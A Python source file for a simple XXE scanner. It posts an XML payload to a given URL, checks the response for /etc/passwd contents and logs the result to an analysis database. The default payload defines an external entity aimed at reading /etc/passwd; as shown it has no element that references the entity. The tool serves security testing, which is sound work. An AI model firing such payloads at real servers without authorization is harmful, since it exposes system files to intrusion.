"""Simple XXE scanner that posts a payload and checks response."""

import argparse
import os
import sys
import urllib.error
import urllib.request

from analysis_db.db_api import log_scan_result
from analysis_db.chat_analyzer import analyze_result


DEFAULT_PAYLOAD = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'


def send_payload(url: str, payload: str) -> tuple[str, dict]:
    """Send the XXE payload and return response body and raw request info."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    data = payload.encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/xml")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode(errors="ignore")
            raw = {
                "request": payload,
                "status": resp.getcode(),
                "response": body[:200],
            }
            return body, raw
    except Exception as e:
        return "", {"request": payload, "error": str(e)}


def main(argv: list[str] | None = None):
    argv = argv or sys.argv[1:]
    parser = argparse.ArgumentParser(description="Test for XXE")
    parser.add_argument("url")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD)
    args = parser.parse_args(argv)

    print(f"[+] Testing {args.url} for XXE")
    body, raw = send_payload(args.url, args.payload)
    vulnerabilities = []
    if "root:x:" in body:
        print("[!] XXE vulnerability detected")
        vulnerabilities.append({"payload": args.payload})
    else:
        print("[-] No vulnerability detected")
    result = {
        "target": args.url,
        "payload": args.payload,
        "vulnerabilities": vulnerabilities,
        "raw": raw,
    }
    result.update(analyze_result(result))
    sock = os.environ.get("MINC_DB_SOCKET")
    if sock:
        try:
            log_scan_result(sock, {"module": "xxe_scan", **result})
        except Exception:
            pass
    return result


if __name__ == "__main__":
    main()
